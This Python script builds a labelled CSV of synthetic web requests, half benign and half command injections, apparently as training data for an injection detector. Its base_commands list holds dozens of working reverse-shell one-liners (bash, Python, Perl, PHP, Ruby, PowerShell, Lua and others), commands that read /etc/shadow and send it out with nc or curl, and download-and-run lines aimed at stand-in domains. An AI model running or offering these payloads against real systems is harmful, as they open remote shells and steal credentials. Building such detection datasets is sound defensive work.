import random
import csv
import ipaddress
import secrets
import base64
import string
import datetime

# Generate Random 384-bit Pre-Shared Key to be used in certain base commands

def gen_psk():
    return secrets.token_hex(48) # 48 bytes * 8 = 384 bits

# Generate Random IPV4 IP Address

def gen_ipv4_addr():
    return str(ipaddress.IPv4Address(random.randint(0, 2**32 - 1)))

# Generate Random IPV6 IP Address

def gen_ipv6_addr():
    return str(ipaddress.IPv6Address(random.randint(0, 2**128 - 1)))

# Generate Random Port

def gen_port():
    return random.randint(1, 65535)

# Generate random application engine file and extension

def gen_file():
    files = ['index', 'login', 'register', 'admin', 'config', 'upload', 'download',
             'contact', 'home', 'search', 'update', 'edit', 'delete', 'view', 'settings',
             'post', 'comments', 'gallery', 'api', 'profile']
    
    extensions = ['.php', '.asp', '.aspx', '.jsp', '.jspx', '.cgi', '.pl', '.py', '.js']

    return f"{random.choice(files)}{random.choice(extensions)}"

# Generate random timestamp that is a day in the past

def gen_timestamp():
    date = datetime.datetime.now().date() - datetime.timedelta(days=1)
    gen_time = datetime.timedelta(
        hours=random.randint(0, 23),
        minutes=random.randint(0, 59),
        seconds=random.randint(0, 59)
    )
    
    return datetime.datetime.combine(date, datetime.time()) + gen_time

# Generate random query parameter to be used with the generated file extension

def query_param():
    parameters = ['id', 'page', 'sort', 'order', 'search', 'filter', 'lang', 
                  'category', 'item', 'view', 'download', 'upload', 'date', 
                  'name', 'user', 'title', 'article', 'post', 'comment', 'profile', 
                  'tag', 'ref', 'time', 'format', 'callback', 'type',
                  'username', 'password', 'email', 'action', 'phone', 'code']
    
    param_name = random.choice(parameters)

    # Generate random values for each parameter

    parameter_values = {
        'id': str(random.randint(1, 100)),
        'page': str(random.randint(1, 100)),
        'dir': random.choice(['asc', 'desc']),
        'sort': random.choice(['name', 'date', 'id']),
        'order': random.choice(['asc', 'desc']),
        'search': ''.join(random.choices(string.ascii_letters + string.digits, k=5)),
        'filter': random.choice(['category1', 'category2', 'category3']),
        'lang': random.choice(['en', 'es', 'fr', 'de', 'it', 'ru']),
        'category': random.choice(['books', 'movies', 'music']),
        'item': str(random.randint(1, 1000)),
        'view': random.choice(['list', 'grid']),
        'download': str(random.randint(1, 1000)),
        'upload': str(random.randint(1, 1000)),
        'name': ''.join(random.choices(string.ascii_letters + string.digits, k=5)),
        'user': ''.join(random.choices(string.ascii_letters + string.digits, k=5)),
        'title': ''.join(random.choices(string.ascii_letters + string.digits, k=5)),
        'article': str(random.randint(1, 1000)),
        'post': str(random.randint(1, 1000)),
        'comment': str(random.randint(1, 1000)),
        'profile': str(random.randint(1, 1000)),
        'tag': ''.join(random.choices(string.ascii_letters + string.digits, k=5)),
        'ref': ''.join(random.choices(string.ascii_letters + string.digits, k=5)),
        'callback': ''.join(random.choices(string.ascii_letters + string.digits, k=5)),
        'type': random.choice(['public', 'private']),
        'action': random.choice(['edit', 'delete', 'create']),
        'date': f"{random.randint(1, 12)}/{random.randint(1, 28)}/{random.randint(2000, 2025)}",
        'time': f"{random.randint(0, 23)}:{random.randint(0, 59)}:{random.randint(0, 59)}",
        'username': ''.join(random.choices(string.ascii_letters + string.digits, k=5)),
        'password': ''.join(random.choices(string.ascii_letters + string.digits, k=10)),
        'email': ''.join(random.choices(string.ascii_letters + string.digits, k=5)) + "@mail.com",
        'phone': ''.join(random.choices(string.digits, k=10)),
        'code': ''.join(random.choices(string.ascii_letters + string.digits, k=5)),
        'format': random.choice(['json', 'xml', 'csv', 'txt'])
    }
    
    if param_name in parameters:
        return f"{param_name}={parameter_values[param_name]}"
    else:
        return f"{param_name}=default"

# Domain list to use randomly in benign or command injection requests

domains = [
    
    "techzonehub.com",
    "brightlightmedia.net",
    "pixelcreatives.org",
    "teslatwittertwins.com",
    "quantumcomputers.net",
    "socialnetworkingplus.com",
    "smartcities4future.com",
    "ecoworldsolutions.xyz",
    "ifyouarentfirstyourlast.nl",
    "whereisthemeatloaf.ru",
]

# Top 20 Most Common Sub-Directory list to use randomly in benign or command injection requests

sub_dir_comm = ["", "blog", "admin", "login", "users", "profile", "search", "images", "forum", "register", "download", "uploads", "news", "api", "support", "contact", "faq", "gallery", "resourcecs", "dashboard", "events"]

# Common Query Seperator that sits between the application engine script file and the query

q_sep = ["?", ";"]

# Generate Random Benign Traffic

def gen_benign():
    dirsub = random.choice(sub_dir_comm)
    domain = random.choice(domains)
    file = gen_file()
    param = query_param()
    timestamp = gen_timestamp()
    query_sep = random.choice(q_sep)
    #url = f"https://{domain}/{dirsub}/{random.randint(1, 100)}"
    url = f"https://{domain}/{dirsub}/{file}{query_sep}{param}"
    method = random.choice(["GET", "POST", "PUT", "DELETE"])
    #query = f"param{random.randint(1, 10)}={random.randint(1, 100)}"
    query = f"{query_sep}{param}"
    return {"timestamp": timestamp, "url": url, "method": method, "query": query, "label": 0}

# Generate Random Command Injection Traffic

def gen_comm_inj():
    
    # List of commonly used command injection techniques including enumeration commands, escalation, and shell access
    
    base_commands = [

        "ls",
        "find / -name \"*.conf\"",
        "grep -r \"password\"",
        "cat /etc/shadow", 
        "cat /etc/passwd",
        "id",
        "ps aux",
        "netstat -tuln",
        "df -h",
        "whoami",
        "uname -a",
        "ifconfig",
        "wget http://{mal_domain}/malware",
        "nc -e /bin/bash {ip_address} {port}",
        "nc -e /bin/sh {ip_address} {port}",
        "nc -c bash {ip_address} {port}",
        "ncat {ip_address} {port} -e /bin/bash",
        "ncat --udp {ip_address} {port} -e /bin/bash",
        "mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect {ip_address}:{port} > /tmp/s; rm /tmp/s",
        "rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip_address} {port} >/tmp/f",
        "rm -f /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc {ip_address} {port} >/tmp/f",
        "bash -i >& /dev/tcp/{ip_address}/{port} 0>&1",
        "0<&196;exec 196<>/dev/tcp/{ip_address}/{port}; sh <&196 >&196 2>&196",
        "/bin/bash -l > /dev/tcp/{ip_address}/{port} 0<&1 2>&",
        "sh -i >& /dev/udp/{ip_address}/{port} 0>&1"
        "perl -e 'use Socket;$i=\"{ip_address}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
        "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"{ip_address}:{port}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'",
        "perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,\"{ip_address}:{port}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'",
        "nc {ip_address} {port} < /etc/passwd",
        "nc {ip_address} {port} < /etc/shadow",
        "nc -w 3 {ip_address} {port} > /tmp",
        "scp /etc/passwd root@{ip_address}:/tmp",
        "curl -X POST --data-binary @/etc/passwd",
        "curl -X POST --data-binary @/etc/shadow",
        "export RHOST=\"{ip_address}\"; export RPORT=\"{port}\"; export PSK=\"{psk}\"; export PIPE=\"/tmp/`openssl rand -hex 4`\"; mkfifo $PIPE; /bin/sh -i < $PIPE 2>&1 | openssl s_client -quiet -tls1_2 -psk $PSK -connect $RHOST:$RPORT > $PIPE; rm $PIPE"
        "export RHOST=\"{ip_address}\";export RPORT={port};python -c 'import socket,os,pty;s=socket.socket();s.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")'",
        "python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip_address}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'",
        "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip_address}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
        "python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip_address}\",{port}));subprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'",
        "python -c 'socket=__import__(\"socket\");os=__import__(\"os\");pty=__import__(\"pty\");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip_address}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'",
        "python -c 'socket=__import__(\"socket\");subprocess=__import__(\"subprocess\");os=__import__(\"os\");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip_address}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
        "python -c 'socket=__import__(\"socket\");subprocess=__import__(\"subprocess\");s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{ip_address}\",{port}));subprocess.call([\"/bin/sh\",\"-i\"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'",
        "python -c 'a=__import__;s=a(\"socket\");o=a(\"os\").dup2;p=a(\"pty\").spawn;c=s.socket(s.AF_INET,s.SOCK_STREAM);c.connect((\"{ip_address}\",{port}));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(\"/bin/sh\")'",
        "python -c 'a=__import__;b=a(\"socket\");p=a(\"subprocess\").call;o=a(\"os\").dup2;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect((\"{ip_address}\",{port}));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p([\"/bin/sh\",\"-i\"])'",
        "python -c 'a=__import__;b=a(\"socket\");c=a(\"subprocess\").call;s=b.socket(b.AF_INET,b.SOCK_STREAM);s.connect((\"{ip_address}\",{port}));f=s.fileno;c([\"/bin/sh\",\"-i\"],stdin=f(),stdout=f(),stderr=f())'",
        "python -c 'a=__import__;s=a(\"socket\").socket;o=a(\"os\").dup2;p=a(\"pty\").spawn;c=s();c.connect((\"{ip_address}\",{port}));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(\"/bin/sh\")'",
        "python -c 'a=__import__;b=a(\"socket\").socket;p=a(\"subprocess\").call;o=a(\"os\").dup2;s=b();s.connect((\"{ip_address}\",{port}));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p([\"/bin/sh\",\"-i\"])'",
        "python -c 'a=__import__;b=a(\"socket\").socket;c=a(\"subprocess\").call;s=b();s.connect((\"{ip_address}\",{port}));f=s.fileno;c([\"/bin/sh\",\"-i\"],stdin=f(),stdout=f(),stderr=f())'",
        "python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((\"{ip_address_v6}\",{port},0,2));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'",
        "python -c 'socket=__import__(\"socket\");os=__import__(\"os\");pty=__import__(\"pty\");s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((\"{ip_address_v6}\",{port},0,2));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/sh\")'",
        "python -c 'a=__import__;c=a(\"socket\");o=a(\"os\").dup2;p=a(\"pty\").spawn;s=c.socket(c.AF_INET6,c.SOCK_STREAM);s.connect((\"{ip_address_v6}\",{port},0,2));f=s.fileno;o(f(),0);o(f(),1);o(f(),2);p(\"/bin/sh\")'",
        "php -r '$sock=fsockopen(\"{ip_address}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "php -r '$sock=fsockopen(\"{ip_address}\",{port});shell_exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "php -r '$sock=fsockopen(\"{ip_address}\",{port});`/bin/sh -i <&3 >&3 2>&3`;'",
        "php -r '$sock=fsockopen(\"{ip_address}\",{port});system(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "php -r '$sock=fsockopen(\"{ip_address}\",{port});passthru(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "php -r '$sock=fsockopen(\"{ip_address}\",{port});popen(\"/bin/sh -i <&3 >&3 2>&3\", \"r\");'",
        "php -r '$sock=fsockopen(\"{ip_address}\",{port});$proc=proc_open(\"/bin/sh -i\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'",
        "ruby -rsocket -e'f=TCPSocket.open(\"{ip_address}\",{port}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
        "ruby -rsocket -e'exit if fork;c=TCPSocket.new(\"{ip_address}\",\"{port}\");loop{{c.gets.chomp!;(exit! if $_==\"exit\");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){{|io|c.print io.read}}))rescue c.puts \"failed: #{{$_}}\"}}'",
        "ruby -rsocket -e 'c=TCPSocket.new(\"{ip_address}\",\"{port}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){{|io|c.print io.read}}end'",
        "echo 'package main;import\"os/exec\";import\"net\";func main(){{c,_:=net.Dial(\"tcp\",\"{ip_address}:{port}\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go",
        "powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{ip_address}\",{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS \" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()",
        "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{ip_address}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{}};$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\"",
        "powershell IEX (New-Object Net.WebClient).DownloadString('https://{mal_domain}/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')",
        "awk 'BEGIN {{s = \"/inet/tcp/0/{ip_address}/{port}\"; while(42) {{ do{{ printf \"shell>\" |& s; s |& getline c; if(c){{}} while ((c |& getline) > 0) print $0 |& s; close(c); }} }} while(c != \"exit\") close(s); }} }}' /dev/null",
        "telnet {ip_address} {port} | /bin/sh | telnet {ip_address} {port}",
        "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{ip_address}','{port}');os.execute('/bin/sh -i <&3 >&3 2>&3');\"",
        "lua5.1 -e 'local host, port = \"{ip_address}\", {port} local socket = require(\"socket\") local tcp = socket.tcp() local io = require(\"io\") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, \"r\") local s = f:read(\"*a\") f:close() tcp:send(s) if status == \"closed\" then break end end tcp:close()'",
        "IEX(IWR https://{mal_domain}/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell {ip_address} {port}",    ]
        
    # Most common seperators used to escape and execute command code

    separators = [";", "|", "&", "`", "$(", "||", "&&", "%"]
    
    mal_domain = random.choice(domains)
    ip_address = gen_ipv4_addr()
    ip_address_v6 = gen_ipv6_addr()
    port = gen_port()
    file = gen_file()
    param = query_param()
    timestamp = gen_timestamp()
    query_sep = random.choice(q_sep)
    
    # Randomly choose a command to use and fill in the variables also randomly chosen or generated
    command = random.choice(base_commands).format(psk=gen_psk(), mal_domain=mal_domain, ip_address=ip_address, ip_address_v6=ip_address_v6, port=port)
   
    # 50% chance of the command injection commands be encoded in base64 and transformed into a command to decode it in a command injection
    
    if random.random() < 0.5:
        encoded_command = base64.b64encode(command.encode()).decode()
        command = f"echo {encoded_command} | base64 -d | sh"
    
    separator = random.choice(separators)
    full_command = f"{separator}{command}"
    
    domain = random.choice(domains)
    dirsub = random.choice(sub_dir_comm)
    #url = f"https://{domain}/{dirsub}/{random.randint(1, 100)}{full_command}"
    url = f"https://{domain}/{dirsub}/{file}{query_sep}{param}{full_command}"
    method = random.choice(["GET", "POST", "PUT", "DELETE"])
    #query = f"param{random.randint(1, 10)}={random.randint(1, 100)}{full_command}"
    query = f"{random.choice(['?', ';'])}{param}{query_sep}{full_command}"
    return {"timestamp": timestamp, "url": url, "method": method, "query": query, "label": 1}

# Generate the benign and command injection samples

def gen_syn_data(samples):
    data = []
    for _ in range(samples):
        if random.random() < 0.5:
            data.append(gen_benign())
        else:
            data.append(gen_comm_inj())
    return data

# Number of samples to generate

samples = 100000

syn_data = gen_syn_data(samples)

with open("synthetic_web_traffic.csv", "w", newline="") as csvfile:
    fieldnames = ["timestamp", "url", "method", "query", "label"]
    writer = csv.DictWriter(csvfile, fieldnames=fieldnames)
    writer.writeheader()
    for syn_example in syn_data:
        writer.writerow(syn_example)